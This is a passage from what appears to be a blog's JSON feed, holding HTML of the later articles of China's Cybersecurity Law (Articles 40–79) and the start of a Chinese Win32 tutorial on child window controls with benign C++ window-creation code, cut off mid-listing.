/>\n(三) 促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全 服务机构等之间的网络安全信息共享；<br />\n(四) 对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p>\n<h2 id=\"第四章网络信息安全\"><a class=\"anchor\" href=\"#第四章网络信息安全\">#</a> 第四章网络信息安全</h2>\n<p>第四十条网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保 护制度。</p>\n<p>第四十一条网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者 同意。<br />\n网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规 的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和 与用户的约定，处理其保存的个人信息。</p>\n<p>第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集 者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复 原的除外。<br />\n网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防 止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情 况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p>\n<p>第四十三条个人发现网络运营者违反法律、行政法规的规定或者双方的约定收 集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者 收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者 应当采取措施予以删除或者更正。</p>\n<p>第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得 非法出售或者非法向他人提供个人信息。</p>\n<p>第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履 行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法 向他人提供。</p>\n<p>第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施 诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、 通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品 以及其他违法犯罪活动的信息。</p>\n<p>第四十七条网络运营者应当加强对其用户发布的信息的管理，发现法律、行政 法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措 施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p>\n<p>第四十八条任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程 序，不得含有法律、行政法规禁止发布或者传输的信息。<br />\n电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务， 知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存 有关记录，并向有关主管部门报告。</p>\n<p>第四十九条网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报 方式等信息，及时受理并处理有关网络信息安全的投诉和举报。<br />\n网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p>\n<p>第五十条国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现 法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采 取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息， 应当通知有关机构采取技术措施和其他必要措施阻断传播。</p>\n<h2 id=\"第五章监测预警与应急处置\"><a class=\"anchor\" href=\"#第五章监测预警与应急处置\">#</a> 第五章监测预警与应急处置</h2>\n<p>第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统 筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网 络安全监测预警信息。</p>\n<p>第五十二条负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、 本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警 信息。</p>\n<p>第五十三条国家网信部门协调有关部门建立健全网络安全风险评估和应急工作 机制，制定网络安全事件应急预案，并定期组织演练。</p>\n<p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全 事件应急预案，并定期组织演练。<br />\n网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络 安全事件进行分级，并规定相应的应急处置措施。</p>\n<p>第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当 按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下 列措施：<br />\n(一) 要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风 险的监测；<br />\n(二) 组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预 测事件发生的可能性、影响范围和危害程度；<br />\n(三) 向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p>\n<p>第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络 安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除 安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p>\n<p>第五十六条省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网 络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络 的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取 措施，进行整改，消除隐患。</p>\n<p>第五十七条因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中 华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、 行政法规的规定处置。</p>\n<p>第五十八条因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p>\n<h2 id=\"第六章法律责任\"><a class=\"anchor\" href=\"#第六章法律责任\">#</a> 第六章法律责任</h2>\n<p>第五十九条网络运营者不履行本法第二十一条、第二十五条规定的网络安全保 护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安 全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以 上五万元以下罚款。</p>\n<p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告； 拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对 直接负责的主管人员处一万元以上十万元以下罚款。</p>\n<p>第六十条违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下 列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网 络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：<br />\n(一) 设置恶意程序的；<br />\n(二) 对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者 未按照规定及时告知用户并向有关主管部门报告的；<br />\n(三) 擅自终止为其产品、服务提供安全维护的。</p>\n<p>第六十一条网络运营者违反本法第二十四条第一款规定，未要求用户提供真实 身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门 责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以 由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证 或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十 万元以下罚款。</p>\n<p>第六十二条违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活 动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信 息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万 元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、 关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其 他直接责任人员处五千元以上五万元以下罚款。</p>\n<p>第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专 门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活 动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没 收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较 重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款， 并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全 管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全 管理和网络运营关键岗位的工作。</p>\n<p>第六十四条网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主 管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得 — 倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的 主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可 以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业 执照。</p>\n<p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向 他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得 一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p>\n<p>第六十五条关键信息基础设施的运营者违反本法第三十五条规定，使用未经安 全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使 用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任 人员处一万元以上十万元以下罚款。</p>\n<p>第六十六条关键信息基础设施的运营者违反本法第三十七条规定，在境外存储 网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告， 没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停 业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管 人员和其他直接责任人员处一万元以上十万元以下罚款。</p>\n<p>第六十七条违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通 讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由 公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的， 处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于 实施违法犯罪活动的网站、通讯群组。<br />\n单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责 的主管人员和其他直接责任人员依照前款规定处罚。</p>\n<p>第六十八条网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或 者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管 部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元 以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销 相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员 处一万元以上十万元以下罚款。<br />\n电子信息发送服务提供者、应用软件下载服务提供者，不履行本法<br />\n第四十八条第 二款规定的安全管理义务的，依照前款规定处罚。</p>\n<p>第六十九条网络运营者违反本法规定，有下列行为之一的，由有关主管部门责 令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负 责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：<br />\n(一) 不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取 停止传输、消除等处置措施的；<br />\n(二) 拒绝、阻碍有关部门依法实施的监督检查的；<br />\n(三) 拒不向公安机关、国家安全机关提供技术支持和协助的。</p>\n<p>第七十条发布或者传输本法<br />\n第十二条第二款和其他法律、行政法规禁止发布或者 传输的信息的，依照有关法律、行政法规的规定处罚。</p>\n<p>第七十一条有本法规定的违法行为的，依照有关法律、行政法规的规定记入信 用档案，并予以公示。</p>\n<p>第七十二条国家机关政务网络的运营者不履行本法规定的网络安全保护义务的， 由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人 员依法给予处分。</p>\n<p>第七十三条网信部门和有关部门违反本法<br />\n第三十条规定，将在履行网络安全保护 职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员 依法给予处分。<br />\n网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪 的，依法给予处分。</p>\n<p>第七十四条违反本法规定，给他人造成损害的，依法承担民事责任。<br />\n违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p>\n<p>第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华 人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任； 国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者 其他必要的制裁措施。</p>\n<h2 id=\"第七章附则\"><a class=\"anchor\" href=\"#第七章附则\">#</a> 第七章附则</h2>\n<p>第七十六条本法下列用语的含义：<br />\n（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则 和程序对信息进行收集、存储、传输、交换、处理的系统。<br />\n（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破 坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数 据的完整性、保密性、可用性的能力。<br />\n（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。<br />\n（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。<br />\n（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合 识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份 证件号码、个人生物识别信息、住址、电话号码等。</p>\n<p>第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守 本法外，还应当遵守保密法律、行政法规的规定。</p>\n<p>第七十八条 军事网络的安全保护，由中央军事委员会另行规定。</p>\n<p>第七十九条 本法自 2017 年 6 月 1 日起施行。</p>\n",
            "tags": [
                "法律",
                "网络安全法"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E5%AD%90%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/",
            "url": "https://self-ferry.github.io/Win%E5%AD%90%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/",
            "title": "Win子窗口控件",
            "date_published": "2021-07-12T06:36:07.000Z",
            "content_html": "<h1 id=\"子窗口控件\"><a class=\"anchor\" href=\"#子窗口控件\">#</a> 子窗口控件</h1>\n<p>在前边我们已经讲解了窗口的本质。以及如何注册窗口类跟创建窗口。还讲了消息循环.</p>\n<p>那么有很多窗口其实 Windows 已经帮我们创建出来了。我们直接使用即可。而这些窗口都有自己的消息循环。只有改变状态的时候。才会发送消息给我们的父窗口通知.</p>\n<p>此时我们捕获消息就可以进行处理了.<br />\n 控件会自己处理消息，并在自己状态发生改变时通知父窗口。<br />\n预定义的控件有:<br />\n 按钮、复选框、编辑框、静态字符串标签和滚动条等<br />\n子窗口其实就是绘制在主窗口的一个窗口。</p>\n<h1 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h1>\n<p>在 vs2019 中运行</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">WIN32_LEAN_AND_MEAN</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 定义控件标识</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">IDC_EDIT_1</span>   <span class=\"token expression\"><span class=\"token number\">0x100</span></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">IDC_BUTTON_1</span> <span class=\"token expression\"><span class=\"token number\">0x101</span></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">IDC_BUTTON_2</span> <span class=\"token expression\"><span class=\"token number\">0x102</span></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>HINSTANCE g_hInstance<span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 定义全局的 g_hInstance，子窗口可以获取到父窗口的 hInstance</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>LRESULT CALLBACK <span class=\"token function\">WindowProc</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tHWND hwnd<span class=\"token punctuation\">,</span>      </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tUINT uMsg<span class=\"token punctuation\">,</span>      </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tWPARAM wParam<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tLPARAM lParam   </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">int</span> APIENTRY <span class=\"token function\">WinMain</span><span class=\"token punctuation\">(</span>HINSTANCE hInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tHINSTANCE hPrevInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tLPSTR     lpCmdLine<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">int</span>       nCmdShow<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tTCHAR szOutBuff<span class=\"token punctuation\">[</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tg_hInstance <span class=\"token operator\">=</span> hInstance<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 把父窗口的 hInstance 赋值给全局的 g_hInstance，</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tTCHAR className<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"My first window\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tWNDCLASS wndclass <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\twndclass<span class=\"token punctuation\">.</span>hbrBackground <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>HBRUSH<span class=\"token punctuation\">)</span>COLOR_BACKGROUND<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\twndclass<span class=\"token punctuation\">.</span>lpfnWndProc <span class=\"token operator\">=</span> WindowProc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\twndclass<span class=\"token punctuation\">.</span>lpszClassName <span class=\"token operator\">=</span> className<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\twndclass<span class=\"token punctuation\">.</span>hInstance <span class=\"token operator\">=</span> hInstance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token function\">RegisterClass</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>wndclass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tHWND hwnd <span class=\"token operator\">=</span> <span class=\"token function\">CreateWindow</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\tclassName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我的第一个窗口\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\tWS_OVERLAPPEDWINDOW<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t<span class=\"token number\">10</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t<span class=\"token number\">10</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token number\">650</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token number\">400</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\thInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hwnd <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t<span class=\"token function\">wsprintf</span><span class=\"token punctuation\">(</span>szOutBuff<span class=\"token punctuation\">,</span> <span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error: %d\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t<span class=\"token function\">OutputDebugString</span><span class=\"token punctuation\">(</span>szOutBuff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t<span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">,</span> SW_SHOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token function\">UpdateWindow</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tMSG msg<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tBOOL bRet<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>bRet <span class=\"token operator\">=</span> <span class=\"token function\">GetMessage</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>msg<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bRet <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\t\t<span class=\"token function\">wsprintf</span><span class=\"token punctuation\">(</span>szOutBuff<span class=\"token punctuation\">,</span> <span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error: %d\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t\t<span class=\"token function\">OutputDebugString</span><span class=\"token punctuation\">(</span>szOutBuff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t\t\t<span class=\"token function\">TranslateMessage</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t\t<span class=\"token function\">DispatchMessage</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>LRESULT CALLBACK <span class=\"token function\">WindowProc</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\tHWND hwnd<span class=\"token punctuation\">,</span>      </pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\tUINT uMsg<span class=\"token punctuation\">,</span>      </pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\tWPARAM wParam<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\tLPARAM lParam   </pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\tWCHAR szOutBuff<span class=\"token punctuation\">[</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token comment\">//sprintf (szOutBuff,\"消息: % x\\n\",uMsg);   // 查看消息类型</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token comment\">//OutputDebugString(szOutBuff); </span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>uMsg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t<span class=\"token keyword\">case</span> WM_DESTROY<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\t<span class=\"token 